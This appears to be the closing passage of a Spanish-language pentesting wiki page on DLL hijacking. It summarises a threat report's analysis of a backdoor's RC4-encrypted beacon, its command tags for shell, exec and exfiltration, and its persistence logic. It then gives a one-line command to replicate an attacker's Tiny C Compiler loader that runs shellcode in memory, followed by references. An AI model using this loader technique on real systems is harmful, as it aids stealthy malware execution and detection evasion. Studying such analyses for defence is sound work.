- Los beacons construyen un perfil del host delimitado por puntos, anteponen la etiqueta `4Q`, luego lo RC4-encriptan con la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se RC4-descifran y se despachan por un switch de etiquetas (`4T` shell, `4V` exec de proceso, `4W/4X` escritura de archivo, `4Y` lectura/exfil, `4\\` desinstalar, `4` enumeración de unidades/archivos + casos de transferencia por fragmentos).
- El modo de ejecución se condiciona por args de CLI: sin args = instalar persistencia (servicio/clave Run) apuntando a `-i`; `-i` relanza self con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` al lado. El código C provisto por el atacante incrustó shellcode, lo compiló y ejecutó en memoria sin tocar el disco con un PE. Replicar con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run basada en TCC importó `Wininet.dll` en tiempo de ejecución y descargó un shellcode de segunda etapa desde un hardcoded URL, proporcionando un loader flexible que se hace pasar por una ejecución de compilador.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
